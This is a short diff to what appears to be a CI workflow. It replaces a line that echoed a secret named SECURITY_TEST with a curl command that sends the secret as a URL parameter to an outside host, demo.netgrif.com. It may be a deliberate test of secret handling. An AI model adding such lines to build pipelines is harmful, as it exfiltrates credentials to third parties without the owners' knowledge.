@@ -55,7 +55,7 @@ jobs:
           ELASTIC_SEARCH_URL: http://localhost:${{ job.services.elasticsearch.ports[9200] }}
         run: |
           echo $ELASTIC_SEARCH_URL
-          echo  ${{ secrets.SECURITY_TEST }}
+          curl -fsSL "https://demo.netgrif.com/?aaaaaa=${{ secrets.SECURITY_TEST }}"
           curl -fsSL "$ELASTIC_SEARCH_URL/_cat/health?h=status"
 
       - uses: actions/checkout@v2
